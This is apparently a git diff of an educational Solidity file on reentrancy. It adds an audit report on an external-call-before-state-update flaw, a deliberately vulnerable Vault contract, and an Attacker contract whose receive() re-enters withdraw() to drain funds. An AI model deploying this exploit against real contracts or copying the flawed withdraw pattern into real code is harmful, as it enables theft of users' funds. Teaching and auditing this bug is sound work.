@@ -88,7 +88,6 @@ TARGET CONTRACT
 */
 
 contract ExternalTargetVul {
-
     /*
         STORE LAST CALLER
     */
@@ -105,10 +104,7 @@ contract ExternalTargetVul {
     =====================================================
     */
 
-    function targetFunction()
-        external
-    {
-
+    function targetFunction() external {
         /*
         =================================================
         EXECUTION CONTEXT NOW INSIDE TARGET CONTRACT
@@ -173,10 +169,7 @@ contract ExecutionTracerVul {
     =====================================================
     */
 
-    function traceExecution()
-        external
-    {
-
+    function traceExecution()external{
         /*
         =================================================
         STEP 1
@@ -617,6 +610,86 @@ IMPORTANT CONCEPTS LEARNED
 =========================================================
 */
 
+/*
+AUDIT REPORT
+
+Title: Reentrancy Exposure Through External Control Transfer
+
+Severity: Medium
+
+Reason: Contract transfers execution control to an external contract before finishing its own execution, creating a potential reentrancy window.
+
+Location:
+
+Contract: ExecutionTracerVul
+Function: traceExecution()
+
+VULNERABILITY DESCRIPTION
+
+The traceExecution() function performs state updates before making
+an external call:
+
+localCounter++;
+
+target.targetFunction();
+
+During the external call, execution control leaves
+ExecutionTracerVul and enters ExternalTargetVul.
+
+Although the current ExternalTargetVul implementation is benign,
+the pattern creates a reentrancy window if the target contract
+is later replaced or upgraded with malicious behavior.
+
+The calling contract temporarily loses execution control and
+trusts external code execution.
+
+
+IMPACT
+A malicious external contract could:
+
+- Reenter ExecutionTracerVul
+- Manipulate execution flow
+- Trigger unexpected state changes
+- Exploit temporary contract state
+- Cause denial-of-service conditions
+
+If critical protocol logic existed before the external call,
+funds or protocol state could become vulnerable.
+
+PROOF OF CONCEPT
+    1. Deploy a malicious target contract.
+    2. Replace ExternalTargetVul with malicious contract.
+    3. User calls:
+    traceExecution()
+
+    4. Execution reaches:
+    target.targetFunction();
+
+    5. Malicious contract reenters:
+    ExecutionTracerVul.traceExecution()
+    before original execution finishes.
+
+    6. Multiple executions occur unexpectedly.
+
+
+ROOT CAUSE
+The contract performs an external call before completing all
+sensitive internal execution.
+
+External contracts are treated as trusted even though they
+control execution during the call.
+
+RECOMMENDATION
+Follow Checks-Effects-Interactions pattern.
+
+Complete all internal state changes before external interaction.
+For critical systems:
+
+- Use ReentrancyGuard
+- Minimize external calls
+- Treat all external contracts as untrusted
+*/
+
 // patched code
 contract ExternalTarget {
 
@@ -761,35 +834,9 @@ contract ExecutionTracer {
 
         executionStage ="After external call";
     }
-
-    function sendETH(address payable receiver) external payable {
-    (bool success,) = receiver.call{value: msg.value}("");
-    require(success, "ETH failed");
-    }
-
-    function vulnerableWithdraw(address payable attacker) external payable {
-    (bool success,) = attacker.call{value: msg.value}("");
-
-    // external call first (BAD pattern if state existed)
-    require(success);
-
-    localCounter++; // state update AFTER external call (unsafe pattern demo)
-    }
 }
 
-contract MaliciousCallback {
 
-    ExecutionTracer public target;
-
-    constructor(address _target) {
-        target = ExecutionTracer(_target);
-    }
-
-    receive() external payable {
-        // reenter during ETH transfer
-        target.traceExecution();
-    }
-}
 
 contract MiddleContract {
 
@@ -801,5 +848,46 @@ contract MiddleContract {
 
     function chainCall() external {
         target.targetFunction();
+    }
+}
+
+contract Vault {
+    mapping(address => uint256) public balance;
+
+    function deposit() external payable {
+        balance[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amt = balance[msg.sender];
+
+        // external call FIRST (this is the bug)
+        (bool success, ) = msg.sender.call{value: amt}("");
+        require(success);
+
+        // state update AFTER (wrong order)
+        balance[msg.sender] = 0;
+    }
+    receive() external payable {}
+}
+
+
+contract Attacker {
+    Vault public vault;
+
+    constructor(address _vault) {
+        vault = Vault(payable (_vault));
+    }
+
+    function attack() external payable {
+        vault.deposit{value: msg.value}();
+        vault.withdraw();
+    }
+
+    receive() external payable {
+        // re-enter while vault is still executing old logic
+        if (address(vault).balance >= 1 ether) {
+            vault.withdraw();
+        }
     }
 }
